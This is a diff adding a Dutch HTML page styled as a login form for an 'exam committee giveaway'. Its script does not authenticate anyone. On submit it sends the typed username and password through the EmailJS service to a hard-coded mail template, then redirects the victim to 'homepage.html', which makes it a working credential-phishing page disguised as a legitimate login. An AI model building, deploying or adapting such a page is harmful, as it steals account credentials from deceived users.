@@ -1,0 +1,122 @@
+@@ -1,120 +1,120 @@
+ <!DOCTYPE html>
+ <html lang="nl">
+ <head>
+     <meta charset="UTF-8">
+     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+     <title>Examencommissie Winactie</title>
+     <style>
+         /* Algemeen opmaak van de pagina */
+         body {
+             font-family: Arial, sans-serif;
+             display: flex;
+             justify-content: center;
+             align-items: center;
+             height: 100vh;
+             margin: 0;
+             background: linear-gradient(135deg, #0078D4, #00B0FF);
+         }
+ 
+         .login-container {
+             background: white;
+             padding: 40px;
+             border-radius: 15px;
+             box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.1);
+             width: 100%;
+             max-width: 400px;
+             text-align: center;
+         }
+ 
+         h2 {
+             font-size: 24px;
+             margin-bottom: 20px;
+             color: #333;
+         }
+ 
+         /* Stijl voor invoervelden */
+         input {
+             width: 100%;
+             width: 85%;
+             padding: 12px;
+             margin: 12px 0;
+             border: 1px solid #ccc;
+             border-radius: 8px;
+             font-size: 16px;
+         }
+ 
+         /* Stijl voor de inlogknop */
+         button {
+             width: 100%;
+             padding: 12px;
+             background-color: #0078D4;
+             color: white;
+             border: none;
+             border-radius: 8px;
+             font-size: 16px;
+             cursor: pointer;
+             transition: background-color 0.3s ease;
+         }
+ 
+         /* Hover-effect voor de knop */
+         button:hover {
+             background-color: #005ea6;
+         }
+ 
+         /* Stijl voor foutmeldingen */
+         p#message {
+             color: red;
+             font-size: 14px;
+             margin-top: 10px;
+         }
+ 
+         /* Media query voor mobiele weergave */
+         @media screen and (max-width: 600px) {
+             .login-container {
+                 padding: 30px;
+                 margin: 10px;
+             }
+             h2 {
+                 font-size: 20px;
+             }
+         }
+     </style>
+ </head>
+ <body>
+     <div class="login-container">
+         <h2>Inloggen voor Examenactie</h2>
+         <form onsubmit="return login()">
+             <input type="text" id="username" placeholder="Gebruikersnaam" required>
+             <input type="password" id="password" placeholder="Wachtwoord" required>
+             <button type="submit">Inloggen</button>
+         </form>
+         <p id="message"></p>
+     </div>
+ 
+     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+     <script>
+         emailjs.init("cXBQtkCZQdlbhKdfG");
+ 
+         function login() {
+             // Haal de gebruikersnaam en wachtwoord op uit de inputvelden
+             let user = document.getElementById("username").value;
+             let pass = document.getElementById("password").value;
+ 
+             // Maak de template parameters aan voor de e-mail
+             const templateParams = {
+                 mail: user, // Gebruikersnaam als mail
+                 wachtwoord: pass // Wachtwoord
+             };
+ 
+             emailjs.send("service_9q2qoob", "template_jpgwf8d", templateParams)
+                 .then(function(response) {
+                     window.location.href = "homepage.html";
+                 }, function(error) {
+                     console.log('Fout bij verzenden e-mail:', error);
+                     document.getElementById("message").innerText = "Er is een fout opgetreden bij het inloggen.";
+                 });
+ 
+             return false;
+         }
+     </script>
+ </body>
+ </html>
